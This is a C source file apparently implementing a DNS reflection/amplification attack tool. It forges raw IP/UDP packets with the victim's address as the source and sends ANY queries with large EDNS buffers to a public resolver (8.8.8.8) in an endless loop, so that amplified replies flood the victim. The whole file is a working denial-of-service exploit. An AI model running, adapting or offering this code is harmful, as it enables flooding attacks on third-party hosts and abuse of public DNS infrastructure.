#pragma pack(1)
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/time.h>
#include <time.h>



// Typedef the ip_headerdr and udp_headerdr from the netinet libs to prevent 
// an infestation of "struct" in all the checksum and size calculations
typedef struct iphdr ip_header;
typedef struct udphdr udp_header;


// Pseudoheader struct
typedef struct
{
    u_int32_t saddr;
    u_int32_t daddr;
    u_int8_t filler;
    u_int8_t protocol;
    u_int16_t len;
}ps_header;

// DNS header struct
typedef struct
{
    unsigned short dnshdr_id;       // ID
    unsigned short dnshdr_flags;    // DNS Flags
    unsigned short dnshdr_qcount;   // Question Count
    unsigned short dnshdr_ans;      // Answer Count
    unsigned short dnshdr_auth; // Authority RR
    unsigned short dnshdr_add;      // Additional RR
}dns_header;

// Question types
typedef struct
{
    unsigned short dns_type;
    unsigned short dns_class;
}quest_type;

typedef struct{
    unsigned char name;
    unsigned short type;
    unsigned short udplength;
    unsigned char rcode;
    unsigned char ednsversion;
    unsigned short Z;
    unsigned short datalength;
}dns_opt;

void error(char *str)
{
    printf("%s\n",str);
}

// Taken from http://www.binarytides.com/raw-udp-sockets-c-linux/
unsigned short csum(unsigned short *ptr,int nbytes) 
{
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((unsigned char *)&oddbyte)=*(unsigned char *)ptr;
        sum+=oddbyte;
    }

    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;
    
    return(answer);
}

// Taken from http://www.binarytides.com/dns-quest_type-code-in-c-with-linux-sockets/
void urlFormatTransform(unsigned char *after, unsigned char *before){
    strcat((char*)before,".");
    int i, j = 0; 
    for(i = 0 ; i < strlen((char*)before);i++) 
    {
        if(before[i]=='.'){
            *after++ = i - j;
            for(;j<i;j++) *after++ = before[j];
            j++;
        }
    }
    *after++ = 0x00;
    return;
}
void reflectionAttack(char *victim_ip, int victim_port, char *dns_server, int dns_port,
    unsigned char *query_url)
{
    // Building the DNS request data packet
    unsigned char dns_rcrd[32];
    unsigned char *dns_url1;
    dns_url1 = malloc(32);
    strcpy(dns_rcrd, query_url);
    urlFormatTransform(dns_url1 , dns_rcrd);

    int buflen = sizeof(dns_header) + (strlen(dns_url1)+1)+ sizeof(quest_type)+sizeof(dns_opt);
    unsigned char dns_data[buflen];
    
    dns_header *dns = (dns_header *)&dns_data;
    dns->dnshdr_id = (unsigned short) htons(getpid());
    dns->dnshdr_flags = htons(0x0100);
    dns->dnshdr_qcount = htons(1);
    dns->dnshdr_ans = 0;
    dns->dnshdr_auth = 0;
    dns->dnshdr_add = htons(1);
    
    unsigned char *dns_url;
    dns_url = (unsigned char *)&dns_data[sizeof(dns_header)];
    urlFormatTransform(dns_url , dns_rcrd);
    
    quest_type *q;
    q = (quest_type *)&dns_data[sizeof(dns_header) + (strlen(dns_url)+1)];
    q->dns_type = htons(0x00ff);
    q->dns_class = htons(0x1);
    
    dns_opt * dopt = (dns_opt *)&dns_data[sizeof(dns_header) + (strlen(dns_url)+1)+ sizeof(quest_type)];
    dopt->name = 0;
    dopt->type = htons(41);
    dopt->udplength = htons(4096);
    dopt->rcode = 0;
    dopt->ednsversion = 0;
    dopt->Z = htons(0x8000);
    dopt->datalength = 0;

    // Building the IP and UDP headers
    char datagram[4096], *data, *psgram;
    memset(datagram, 0, 4096);
    
    data = datagram + sizeof(ip_header) + sizeof(udp_header);
    memcpy(data, &dns_data, sizeof(dns_header) + (strlen(dns_url)+1) + sizeof(quest_type) +sizeof(dns_opt)+1);
    
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dns_port);
    sin.sin_addr.s_addr = inet_addr(dns_server);
    
    ip_header *ip = (ip_header *)datagram;
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = sizeof(ip_header) + sizeof(udp_header) + sizeof(dns_header) + (strlen(dns_url)+1) + sizeof(quest_type)+sizeof(dns_opt);
    ip->id = htonl(getpid());
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_UDP;
    ip->check = 0;
    ip->saddr = inet_addr(victim_ip);
    ip->daddr = sin.sin_addr.s_addr;
    ip->check = csum((unsigned short *)datagram, ip->tot_len);
    
    udp_header *udp = (udp_header *)(datagram + sizeof(ip_header));
    udp->source = htons(victim_port);
    udp->dest = htons(dns_port);
    udp->len = htons(8+sizeof(dns_header)+(strlen(dns_url)+1)+sizeof(quest_type)+sizeof(dns_opt));
    udp->check = 0;
    
    // Pseudoheader creation and checksum calculation
    ps_header pshdr;
    pshdr.saddr = inet_addr(victim_ip);
    pshdr.daddr = sin.sin_addr.s_addr;
    pshdr.filler = 0;
    pshdr.protocol = IPPROTO_UDP;
    pshdr.len = htons(sizeof(udp_header) + sizeof(dns_header) + (strlen(dns_url)+1) + sizeof(quest_type)+sizeof(dns_opt));

    int pssize = sizeof(ps_header) + sizeof(udp_header) + sizeof(dns_header) + (strlen(dns_url)+1) + sizeof(quest_type)+sizeof(dns_opt);
    psgram = malloc(pssize);
    
    memcpy(psgram, (char *)&pshdr, sizeof(ps_header));
    memcpy(psgram + sizeof(ps_header), udp, sizeof(udp_header) + sizeof(dns_header) + (strlen(dns_url)+1) + sizeof(quest_type)+sizeof(dns_opt));
        
    udp->check = csum((unsigned short *)psgram, pssize);
    
    // Send data
    int sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(sd==-1) error("Could not create socket.");
    else sendto(sd, datagram, ip->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
    
    free(psgram);
    close(sd);
    
    return;
}
void usage(char *str);

int main(int argc, char **argv)
{   
    // Initial uid check and argument count check
    if(getuid()!=0)
        error("You must be running as root!");
    if(argc<3)
        usage(argv[0]);
    
    // Assignments to variables from the given arguments
    char *victim_ip = argv[1];
    int victim_port = atoi(argv[2]);
    char * dns_server = argv[3];
    int dns_port = 53;
    // This code is just an example if you want to use a list of records 
    // to resolve for the attack, or use a list of different DNS servers, etc
    //while(1)
        //dns_send(victim_ip, victim_port, dns_server, 53, dns_rcrd);
    while(1) {
        //reflectionAttack(victim_ip, victim_port, "8.8.8.8", 53, "ietf.org");
        //reflectionAttack(victim_ip, victim_port, "8.8.8.8", 53, "www.amazon.com");
        reflectionAttack(victim_ip, victim_port, "8.8.8.8", 7, "ieee.org");
sleep(3);
    }   
    return 0;
}

void usage(char *str)
{
    printf("%s\n target port\n", str);
    exit(0);
}
